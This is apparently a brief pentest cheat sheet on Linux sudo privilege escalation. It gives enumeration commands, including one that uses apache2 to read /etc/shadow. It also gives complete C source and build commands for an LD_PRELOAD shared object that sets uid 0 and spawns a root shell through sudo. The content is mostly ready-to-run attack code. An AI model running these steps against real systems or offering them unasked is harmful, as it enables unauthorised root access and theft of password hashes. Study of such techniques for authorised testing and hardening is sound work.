                                              ### SUDO Enumeration And Exploit
                                              
                                              
                                              
                                              
   ## Sudo Enumeration 
   
                 sudo -l
                 sudo --version
                 sudo apache2 -f /etc/shadow
                 
                 
                 
   ### LD_PRELOAD and NOPASSWD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```powershell
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
